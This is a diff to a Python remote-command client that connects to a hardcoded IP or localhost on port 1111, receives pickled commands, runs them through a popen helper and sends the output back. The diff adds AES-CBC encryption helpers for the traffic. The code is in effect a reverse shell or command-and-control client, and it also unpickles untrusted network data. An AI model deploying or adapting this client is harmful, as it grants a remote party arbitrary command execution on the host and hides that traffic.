@@ -2,17 +2,30 @@ import socket
 import pickle
 import subprocess
 import time
+import pdb
+from Crypto.Cipher import AES
 
 #||||||||||||||||||||||||||||||CLIENT||||||||||||||||||||||||||
 
 #TODO
-#   1.  At line 34, have the client execute whatever it receives and send it back to the server
 
 
 socket = socket.socket()
 HVA = '145.109.173.68'
 l = 'localhost'
 serverAddress = l, 1111
+
+
+def encryptAES(message, key):
+    obj = AES.new(key[0], AES.MODE_CBC, key[1])
+    ciphertext = obj.encrypt(message)
+    return ciphertext
+
+
+def decryptAES(ciphertext, key):
+    obj2 = AES.new(key[0], AES.MODE_CBC, key[1])
+    message = obj2.decrypt(ciphertext)
+    return message
 
 #   --> Execute a command and return the result of it
 def popenExecution(data):
@@ -35,7 +48,6 @@ def receive(socket):
         message = pickle.loads(socket.recv(2048))
         send(socket, popenExecution(message))
         print(message)
-
 
     except Exception as e:
         print(e)
